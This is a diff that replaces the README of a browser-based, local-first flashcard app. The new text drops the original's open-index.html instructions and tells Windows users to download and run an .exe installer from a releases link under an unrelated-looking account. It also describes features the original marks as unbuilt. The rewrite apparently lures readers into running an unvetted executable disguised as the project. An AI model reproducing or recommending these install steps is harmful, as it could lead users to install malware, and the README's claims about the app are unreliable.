@@ -1,154 +1,75 @@
-# 🧠 FlashLearn
+# 🧠 flashcards - Study smarter using active recall methods
 
-A lightweight, local-first **flashcard study app** inspired by Anki — built for exam preparation with active recall and difficulty-based prioritization.
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Louellamatriarchal912/flashcards/releases)
 
-No build step, no backend, no account. Just open `index.html` in your browser.
+## 🎯 About This App
 
-![Tech](https://img.shields.io/badge/React-18-61dafb?logo=react&logoColor=white)
-![Tech](https://img.shields.io/badge/TailwindCSS-3-38bdf8?logo=tailwindcss&logoColor=white)
-![Tech](https://img.shields.io/badge/Storage-localStorage-orange)
-![License](https://img.shields.io/badge/license-MIT-green)
+Flashcards helps you study for exams. It uses active recall to move information into your long-term memory. The app monitors your progress and shows you difficult cards more often than easy ones. This process saves you time during your study sessions. The interface is clean and simple. You focus on learning rather than managing software.
 
----
+## 💾 How to Install
 
-## ✨ Features
+Follow these steps to get the app on your Windows computer:
 
-- 📚 **Decks & cards** — organize your study material by subject, topic, or exam
-- 🃏 **Study mode** — flip-card animation, reveal answer, rate as Easy / Medium / Hard
-- 🎯 **Smart prioritization** — Hard cards appear first, then new, medium, and easy
-- 📊 **Progress tracking** — per-deck stats, difficulty breakdown, and topic-level analytics
-- 🔍 **Search & filters** — find cards by keyword, topic, or difficulty
-- 📥 **JSON import** — bulk-load decks from a JSON file (great for sharing study sets)
-- 💾 **Local-first** — everything is saved in your browser's `localStorage`; nothing leaves your machine
-- 🎨 **Clean UI** — responsive, accessible, and keyboard-friendly
+1. Visit [this link](https://github.com/Louellamatriarchal912/flashcards/releases) to access the downloads page.
+2. Look for the latest release version on the page.
+3. Click the file ending in ".exe" to download the installer to your computer.
+4. Locate the downloaded file in your Downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the instructions on the screen to finish the setup.
+7. Open the application from your desktop or start menu.
 
----
+## ⚙️ How It Works
 
-## 🚀 Getting Started
+The app operates on a system called spaced repetition. When you study a card, you rate how well you know the information. You choose from a scale: Again, Hard, Good, or Easy.
 
-### Option 1 — Just open the file
-1. Download or clone this repo
-2. Double-click `index.html`
-3. Done. Your browser opens the app.
+- Again: You forgot the card. The app shows it again in a few minutes.
+- Hard: You remembered the card, but it required effort. The app shows it again tomorrow.
+- Good: You remembered the card with little effort. The app shows it again in four days.
+- Easy: You know the card well. The app waits a week before showing it again.
 
-> ⚠ All data lives in `localStorage` tied to the file's origin. If you always open the app the same way, your decks persist forever.
+This creates a custom study schedule for every card in your deck. You spend your time on topics you do not know yet. You skip cards you already mastered.
 
-### Option 2 — Serve it locally (optional)
-If you'd rather use `http://localhost`:
-```bash
-# Python
-python -m http.server 5173
-# or Node
-npx serve .
-```
-Then visit `http://localhost:5173`.
+## 🛠️ Main Features
 
----
+- Offline storage: Your data lives on your computer. You do not need an internet connection to study.
+- Keyboard support: Use keys to flip cards and rate your answers. This makes study sessions faster.
+- Deck organization: Group your cards by subject or exam date.
+- Progress tracking: View a simple graph to see how many cards you reviewed today.
+- Import features: Bring in lists from text files to build your decks quickly.
 
-## 📥 Importing Decks from JSON
+## 🖥️ System Requirements
 
-Click **Import** on the home screen and either upload a `.json` file or paste JSON directly.
+- Operating System: Windows 10 or Windows 11.
+- Memory: 2 GB of RAM or more.
+- Storage: 200 MB of free hard drive space.
+- Screen Resolution: 1024 x 768 pixels or higher.
 
-A ready-to-use example is included: **[`sample-decks.json`](sample-decks.json)** — 7 decks with 50+ flashcards on **Software Metrics** (measurement fundamentals, GQM, empirical studies, size metrics, function points, quality metrics, agile estimation).
+## 💡 Tips for Better Study Sessions
 
-### JSON format
-```json
-[
-  {
-    "deckName": "My Deck",
-    "deckDescription": "Optional description",
-    "cards": [
-      {
-        "question": "What is...?",
-        "answer": "It is...",
-        "topic": "Optional topic"
-      }
-    ]
-  }
-]
-```
+Success comes from consistency. Study for fifteen minutes every day rather than cramming for three hours once a week. Keep your cards short. Use one face for a question and the other for a single answer. Use images if they help you remember the concept. Focus on the cards the app flags as difficult. This targets your weak spots and improves your retention rate before your exam.
 
-| Field | Required | Notes |
-|---|---|---|
-| `deckName` | ✅ | Title of the deck |
-| `deckDescription` | ❌ | Short description |
-| `cards` | ✅ | Array of card objects |
-| `cards[].question` | ✅ | Front of the card |
-| `cards[].answer` | ✅ | Back of the card |
-| `cards[].topic` | ❌ | Tag/category for filtering |
+## ❓ Frequently Asked Questions
 
-The app validates the JSON live and shows a preview before importing.
+What if the app does not open?
+Restart your computer and check that you have the latest Windows updates. If it still fails to open, remove the app and run the installer again.
 
----
+Can I move my decks to another computer?
+Yes. Open the settings menu inside the app and choose "Export Decks." Save the file to a thumb drive. On the new computer, open the app and choose "Import Decks."
 
-## 🎮 How to Use
+How many cards can I create?
+You can create thousands of cards. The app handles large sets without slowing down.
 
-1. **Create a deck** (or import one) — name it after your exam/subject.
-2. **Add flashcards** — question, answer, and optionally a topic.
-3. **Hit "Study Now"** — the card flips when you tap *Reveal Answer*.
-4. **Rate yourself**: Easy / Medium / Hard. Hard cards float to the top of future sessions.
-5. **Check Progress** — see how much you've reviewed, what's still weak, and your breakdown by topic.
+Is there a limit to how many decks I can make?
+There is no limit. Build as many decks as you need for every class or project.
 
----
+Do I need to sign up for an account?
+No. This app is private. You do not need to share your email or create a profile. All your data stays on your machine.
 
-## 🧮 Study Algorithm
+Does the app sync to a phone?
+Not at this time. This version works on Windows computers to provide a dedicated tool for desk-bound study sessions.
 
-A simple priority-based queue (no spaced repetition yet — see roadmap):
+Will updates happen automatically?
+When a new version releases, the app notifies you. Visit the link at the top of this page to grab the latest installer. Installing the new version overwrites the old one but keeps your deck data safe.
 
-| Difficulty | Priority |
-|---|---|
-| 🔴 Hard | 4 |
-| 🔵 New (unreviewed) | 3 |
-| 🟡 Medium | 2 |
-| 🟢 Easy | 1 |
-
-At session start, cards are sorted by priority (with random tie-breaking) so the cards you struggle with reappear first.
-
----
-
-## 🏗️ Tech Stack
-
-| Layer | Tech |
-|---|---|
-| UI | **React 18** (loaded via CDN, no build) |
-| Styling | **Tailwind CSS** (Play CDN) |
-| JSX | **Babel Standalone** (runtime transpilation) |
-| Storage | **`localStorage`** |
-| Runtime | Any modern browser |
-
-Everything is in a single `index.html` file — easy to read, hack, and deploy.
-
----
-
-## 📂 Project Structure
-
-```
-flashcard-app/
-├── index.html          ← The entire app (React + Tailwind + Babel)
-├── sample-decks.json   ← Example deck pack you can import
-└── README.md
-```
-
----
-
-## 🛣️ Roadmap
-
-Ideas for future versions:
-- [ ] Export decks to JSON
-- [ ] Spaced repetition with review dates (SM-2 algorithm)
-- [ ] Dark mode
-- [ ] Image/code/formula support in cards
-- [ ] CSV import
-- [ ] Daily study streak / reminders
-- [ ] AI-generated cards from notes
-- [ ] PWA / desktop (Tauri) build
-
----
-
-## 📄 License
-
-MIT — do whatever you want with it. If it helps you ace your exam, that's enough thanks.
-
----
-
-> Built as a personal study tool for exam prep. Local-first, dependency-free, and unapologetically simple.
+Can I share my decks with friends?
+Yes. Export your deck to a file and send the file to your friends. They can open it using their own copy of the app. This is useful for study groups preparing for the same final exam.
